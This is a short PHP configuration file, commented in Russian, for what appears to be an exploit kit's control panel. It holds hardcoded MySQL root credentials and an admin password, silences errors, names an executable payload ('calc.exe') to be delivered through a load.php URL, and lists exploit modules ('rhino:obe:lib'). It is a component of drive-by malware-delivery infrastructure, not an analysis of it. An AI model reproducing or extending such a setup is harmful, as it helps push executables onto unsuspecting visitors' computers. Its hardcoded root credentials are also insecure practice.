<?php
error_reporting(0);
// MYSQL настройки
$dblocation = "localhost";
$dbname = "sakura";
$dbuser = "root";
$dbpass = "sak010";
//Админ
$pass = "novasenha321";

$dbcon = @mysql_connect($dblocation, $dbuser, $dbpass);
if(!$dbcon)
{
	echo("<P>Server of database is not avaible</P>");
	exit();
}
if(!@mysql_select_db($dbname,$dbcon))
{
	echo("<P>Database is not avaible</P>");
	exit();
}

//Настройки файлов
$filename = "calc.exe"; //Подгружаемый файл
$url ="http://".$_SERVER["HTTP_HOST"].str_replace ("\\", "/", dirname ($_SERVER["PHP_SELF"]));
$host = $url;
$url = $url."/load.php";
$config['exploits'] = 'rhino:obe:lib';
?>